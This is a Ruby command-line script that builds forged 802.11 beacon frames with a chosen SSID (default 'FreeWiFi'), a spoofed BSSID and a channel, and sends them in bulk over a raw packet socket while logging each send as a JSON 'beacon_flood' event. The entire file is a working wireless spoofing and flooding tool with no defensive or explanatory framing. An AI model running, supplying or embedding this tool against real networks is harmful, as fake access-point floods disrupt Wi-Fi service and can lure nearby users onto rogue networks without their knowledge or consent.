#!/usr/bin/env ruby
# frozen_string_literal: true

require 'socket'
require 'json'
require 'time'

ETH_P_ALL = [0x0003].pack('n').unpack1('S')

def mac2bin(s)
  s.split(':').map { |b| b.to_i(16).chr }.join
end

def if_nametoindex(name)
  Socket.getifaddrs.select { |a| a.name == name }.first&.ifindex
end

def build_beacon(ssid, bssid, channel, seq)
  fc = [0x80, 0x00].pack('C*')
  dur = [0x0000].pack('v')
  da = "\xff\xff\xff\xff\xff\xff"
  sa = bssid
  bssid_f = bssid
  sc = [seq << 4].pack('v')

  ts = [0].pack('Q<')
  interval = [0x0064].pack('v')
  cap = [0x2101].pack('v')

  ssid_el = [0x00, ssid.bytesize].pack('CC') + ssid
  rates = [0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24].pack('C*')
  rates_el = [0x01, 8].pack('CC') + rates
  ds_el = [0x03, 0x01, channel].pack('CCC')

  rsn = [0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x01, 0x00,
         0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f,
         0xac, 0x02, 0x00, 0x00].pack('C*')
  rsn_el = [0x30, rsn.bytesize].pack('CC') + rsn

  body = ts + interval + cap + ssid_el + rates_el + ds_el + rsn_el
  fc + dur + da + sa + bssid_f + sc + body
end

begin
  iface = ARGV[0]
  channel = (ARGV[2] || 1).to_i
  count = (ARGV[3] || 100).to_i
  ssid = ARGV[4] || 'FreeWiFi'
  bssid = mac2bin(ARGV[5] || 'AA:BB:CC:DD:EE:FF')

  raise 'interface required' unless iface

  ifidx = if_nametoindex(iface)
  raise "interface #{iface} not found" unless ifidx

  sock = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, ETH_P_ALL)
  sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_SNDBUF, 65536)

  count.times do |i|
    seq = rand(0..4095)
    frame = build_beacon(ssid, bssid, channel, seq)
    addr = Socket.pack_sockaddr_ll(ETH_P_ALL, ifidx, 0, 0, 0, '')
    sent = sock.send(frame, 0, addr)

    puts JSON.generate({
      event: 'beacon_flood', iface: iface,
      bssid: ARGV[5] || 'AA:BB:CC:DD:EE:FF',
      ssid: ssid, channel: channel,
      data: { seq: seq, bytes: sent, count: i + 1, total: count },
      timestamp: Time.now.iso8601
    })
    $stdout.flush
    sleep(0.005)
  end

  sock.close
rescue Interrupt
  puts JSON.generate({ event: 'beacon_flood', iface: iface || '',
    data: { status: 'interrupted' }, timestamp: Time.now.iso8601 })
rescue => e
  $stderr.puts JSON.generate({ event: 'error', data: { message: e.message,
    backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601 })
  exit 1
end
